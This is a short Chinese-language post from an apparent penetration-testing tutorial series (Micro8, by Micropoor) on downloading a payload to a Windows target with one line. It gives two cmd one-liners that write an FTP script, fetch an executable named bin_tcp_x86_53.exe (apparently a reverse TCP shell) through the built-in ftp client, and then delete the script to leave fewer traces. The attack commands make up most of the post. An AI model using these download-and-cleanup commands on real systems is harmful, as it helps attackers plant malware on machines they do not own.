---
title: 70、ftp一句话下载payload补充
date: 2019-09-21 19:06:12
comments: true
categories: 
 - Micro8系列
---


**windows 全平台自带ftp，在实战中需要考虑两点。**  
* 数据传输的完整性。  
* 代码得精简

本季作为第四十课的补充，一句话下载更为精简。更符合于实战。

**靶机：**  
192.168.1.119  

**demo下载文件为：**  
bin_tcp_x86_53.exe  
![](../do/media/a0c59424cccd7240a929a043c65a10d1.jpg)

```code
echo open 127.0.0.1 > o&echo user 123 123 >> o &echo get bin_tcp_x86_53.exe >> o &echo quit >> o &ftp ‐n ‐s:o &del /F /Q o
```

![](../do/media/3f470da4395e76cac4553c1c7081a718.jpg)



缩短一句话下载：
```code
echo open 127.0.0.1 > o&echo get bin_tcp_x86_53.exe >> o &echo quit >> o &ftp ‐A ‐n ‐s:o &del /F /Q o
```
![](../do/media/b4b18ed037915cf463987e9a1bd3ba9c.jpg)

![](../do/media/bf3ffa7da2f7737d7b8f4be920d3b143.jpg)

>   Micropoor
